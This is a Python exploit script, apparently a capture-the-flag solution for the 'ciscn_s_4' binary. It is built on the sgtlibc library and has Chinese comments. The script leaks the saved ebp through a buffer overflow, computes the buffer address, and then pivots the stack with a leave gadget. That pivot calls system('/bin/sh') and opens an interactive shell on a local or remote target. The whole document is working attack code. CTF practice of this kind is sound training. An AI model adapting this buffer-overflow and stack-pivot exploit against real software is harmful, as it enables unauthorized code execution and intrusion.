import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os

set_config(GameBoxConfig(
    is_local=True,
    file='./ciscn_s_4',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

pause()
# 栈迁移：泄露ebp或某个既定地址
buf_size = 40
payload = [b'a' * (buf_size-4), fakeebp()]  # 方便查看结尾
se(payload)  # read话用se ， scanf 用sl
ru(fakeebp())
ebp = u00(rc(4))
buf_start = ebp - 0x38  # 查看发现ebp - buf_start = 0x38
log.info(f'ebp:{hex(ebp)}')
log.info(f'buf_start:{hex(buf_start)}')

system_addr = elf.plt['system']  # system要用plt，而不能用call

payload = [system_addr, fakeebp(), buf_start+12]
payload += [b'/bin/sh\x00']
payload = payload.ljust(buf_size, b'a')
payload += [buf_start-4]  # 因为rsp会++，所以buf-4
payload += [elf.rop['leave']]  # 使用leave重置栈继续执行
se(payload)
interactive()
